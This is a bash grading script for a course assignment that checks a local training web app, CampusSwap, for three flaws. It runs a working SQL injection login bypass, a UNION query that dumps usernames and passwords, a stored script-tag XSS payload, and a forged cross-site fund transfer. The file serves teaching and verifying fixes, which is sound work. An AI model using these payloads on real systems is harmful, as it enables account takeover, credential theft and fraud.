#!/usr/bin/env bash
#
# verify.sh — CYSE 411 Assignment 4 grading helper
# ------------------------------------------------
# Runs the three attacks against a running CampusSwap instance and reports,
# for each, whether it is EXPLOITABLE or SAFE. Works on BOTH the vulnerable
# starter and a correctly-patched submission (it auto-detects and includes a
# CSRF token when the form provides one, so a fixed app is graded fairly).
#
# Usage:
#   bash verify.sh                       # http://localhost:3000
#   bash verify.sh http://localhost:3001
#
# Expected: vulnerable build -> 3x EXPLOITABLE ; correct fix -> 3x SAFE.

BASE="${1:-http://localhost:3000}"
TMP="$(mktemp -d)"
pass=0; fail=0

red(){ printf '\033[31m%s\033[0m' "$1"; }
grn(){ printf '\033[32m%s\033[0m' "$1"; }

# Extract the _csrf value from a page (empty string if the form has none).
tok(){ grep -oE '_csrf" value="[A-Za-z0-9]+' "$1" 2>/dev/null | head -1 | grep -oE '[A-Za-z0-9]+$'; }

# Log in as $2/$3 using jar $1, transparently supplying a token if required.
login(){
  local jar="$1" user="$2" pass="$3"
  curl -s -c "$jar" -b "$jar" "$BASE/login" > "$TMP/lp.html"
  local t; t="$(tok "$TMP/lp.html")"
  curl -s -c "$jar" -b "$jar" \
    --data-urlencode "username=$user" --data-urlencode "password=$pass" \
    --data-urlencode "_csrf=$t" "$BASE/login" -o /dev/null
}

echo "Target: $BASE"
echo "=================================================================="

# -------- V1: SQL injection ------------------------------------------------
echo "[V1] SQL Injection"
J="$TMP/v1.jar"
curl -s -c "$J" -b "$J" "$BASE/login" > "$TMP/v1_login.html"
T="$(tok "$TMP/v1_login.html")"
curl -s -c "$J" -b "$J" \
  --data-urlencode "username=quartermaster' -- " \
  --data-urlencode "password=x" \
  --data-urlencode "_csrf=$T" "$BASE/login" -o /dev/null
WHO="$(curl -s -b "$J" "$BASE/wallet" | grep -oE 'Signed in as <strong>[^<]+' | grep -oE '[^>]+$')"
LEAK="$(curl -s -G "$BASE/search" --data-urlencode "q=zzz%' UNION SELECT id, username || ':' || password, credits FROM users -- " | grep -oE '<strong>[a-zA-Z]+:[^<]+</strong>' | head -1)"
if [ "$WHO" = "quartermaster" ] || [ -n "$LEAK" ]; then
  echo "  bypass-as: '${WHO:-none}' | union-leak: '${LEAK:-none}'"
  echo "  result: $(red EXPLOITABLE)"; fail=$((fail+1))
else
  echo "  bypass blocked, no credential leak"
  echo "  result: $(grn SAFE)"; pass=$((pass+1))
fi
echo "------------------------------------------------------------------"

# -------- V2: Stored XSS ---------------------------------------------------
echo "[V2] Stored XSS"
J="$TMP/v2.jar"
login "$J" mallory letmein123
curl -s -b "$J" -c "$J" "$BASE/item/1" > "$TMP/item.html"
T="$(tok "$TMP/item.html")"
MARK="xsscheck$RANDOM"
curl -s -b "$J" -c "$J" \
  --data-urlencode "body=<script>window.__$MARK=1</script>" \
  --data-urlencode "_csrf=$T" "$BASE/item/1/comment" -o /dev/null
PAGE="$(curl -s "$BASE/item/1")"
CSP="$(curl -s -D - -o /dev/null "$BASE/item/1" | grep -io 'content-security-policy' | head -1)"
HTTPONLY="$(curl -s -D - -o /dev/null -c "$TMP/hc.jar" "$BASE/" | grep -io 'httponly' | head -1)"
if echo "$PAGE" | grep -q "<script>window.__$MARK=1</script>"; then
  echo "  raw <script> reflected into page (executes in a browser)"
  echo "  CSP header: ${CSP:-absent} | cookie HttpOnly: ${HTTPONLY:-no}"
  echo "  result: $(red EXPLOITABLE)"; fail=$((fail+1))
else
  echo "  payload escaped in output"
  echo "  CSP header: ${CSP:-absent} | cookie HttpOnly: ${HTTPONLY:-no}"
  echo "  result: $(grn SAFE)"; pass=$((pass+1))
fi
echo "------------------------------------------------------------------"

# -------- V3: CSRF ---------------------------------------------------------
echo "[V3] CSRF on /wallet/transfer"
J="$TMP/v3.jar"
login "$J" alice sunshine22
BEFORE="$(curl -s -b "$J" "$BASE/wallet" | grep -oE 'Balance: <strong>[0-9]+' | grep -oE '[0-9]+')"
# Forge the request the way a cross-site attacker would: victim cookie, but no
# valid token (attacker can't read it). A GUESSED token must be rejected too.
curl -s -b "$J" \
  -H "Origin: http://attacker.example" \
  --data-urlencode "to=mallory" --data-urlencode "amount=111" \
  --data-urlencode "_csrf=forged_guess_0000" "$BASE/wallet/transfer" -o /dev/null
AFTER="$(curl -s -b "$J" "$BASE/wallet" | grep -oE 'Balance: <strong>[0-9]+' | grep -oE '[0-9]+')"
if [ "${BEFORE:-0}" != "${AFTER:-0}" ]; then
  echo "  balance changed $BEFORE -> $AFTER via forged request"
  echo "  result: $(red EXPLOITABLE)"; fail=$((fail+1))
else
  echo "  forged request rejected (balance unchanged at ${BEFORE:-?})"
  echo "  result: $(grn SAFE)"; pass=$((pass+1))
fi
echo "=================================================================="
echo "SAFE: $pass / 3    EXPLOITABLE: $fail / 3"
rm -rf "$TMP"
